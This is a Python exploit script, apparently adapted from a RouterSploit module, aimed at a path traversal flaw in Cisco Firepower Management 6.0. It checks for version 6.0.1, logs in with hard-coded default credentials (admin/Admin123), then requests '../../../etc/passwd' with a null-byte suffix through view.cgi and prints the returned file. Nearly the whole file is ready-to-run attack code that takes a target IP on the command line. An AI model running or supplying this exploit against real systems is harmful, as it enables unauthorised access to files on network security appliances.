target = ""
# rsf exploit module
# description: Module exploits Cisco Firepower Management 6.0 Path Traversal vulnerability which allows retrieving content of arbitrary files.

import requests
import re

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.path = "/etc/passwd"
        self.username = "admin"
        self.password = "Admin123"
        self.session = requests.Session()

    def run(self):
        if self.check():
            print("[+] Target seems to be vulnerable")
            if self.login():
                file_path = "../../..{}".format(self.path)
                path = f"http://{self.target}:{self.port}/events/reports/view.cgi?download=1&files={file_path}%00"
                
                print(f"[*] Requesting: {file_path}")
                response = self.session.get(path)
                
                if response and response.text and "empty or is not available to view" not in response.text:
                    print("[+] Exploit success")
                    print(response.text)
                else:
                    print("[-] Exploit failed")
            else:
                print("[-] Authentication failed")
        else:
            print("[-] Target not vulnerable")

    def check(self):
        try:
            response = requests.get(f"http://{self.target}:{self.port}/login.cgi?logout=1")
            return response and "6.0.1" in response.text
        except:
            return False

    def login(self):
        data = {
            "username": self.username,
            "password": self.password,
            "target": ""
        }
        
        try:
            response = self.session.post(
                f"http://{self.target}:{self.port}/login.cgi?logout=1",
                data=data,
                allow_redirects=False
            )
            return response and response.status_code == 302 and "CGISESSID" in response.cookies.get_dict()
        except:
            return False



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
